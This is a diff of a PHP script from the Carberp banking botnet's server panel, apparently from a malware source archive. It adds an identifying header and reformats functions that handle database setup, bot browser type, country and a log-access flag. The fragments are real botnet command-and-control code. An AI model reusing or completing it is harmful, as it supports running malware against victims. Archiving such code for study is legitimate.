@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 $dir = str_replace('/scripts/get', '', str_replace('\\', '/', realpath('.'))) . '/';
@@ -20,7 +31,8 @@ include_once($dir . 'includes/functions.encoding.php');
 
 // CREATE TABLE IF NOT EXISTS bf_logs_20110720 LIKE bf_logs
 
-function start_db(){	global $dir, $mysqli, $dn;
+function start_db(){
+	global $dir, $mysqli, $dn;
 
 	//SELECT DATE_FORMAT( CURRENT_TIMESTAMP(), '%H' ) date
 	include_once($dir . 'includes/functions.get_config.php');
@@ -42,7 +54,8 @@ function start_db(){	global $dir, $mysqli, $dn;
 	}
 }
 
-function start_brw(){	global $brw;
+function start_brw(){
+	global $brw;
 	switch($_POST['brw']){
 		case 1: $brw = 'IE'; break;
 		case 2: $brw = 'FF'; break;
@@ -67,8 +80,10 @@ function start_country(){
 	if(empty($country)) $country = 'UNK';
 }
 
-function getlog(){	global $config;
-	if($config['getlog'] == 1){		print_data('403', true);
+function getlog(){
+	global $config;
+	if($config['getlog'] == 1){
+		print_data('403', true);
 		exit;
 	}
 }
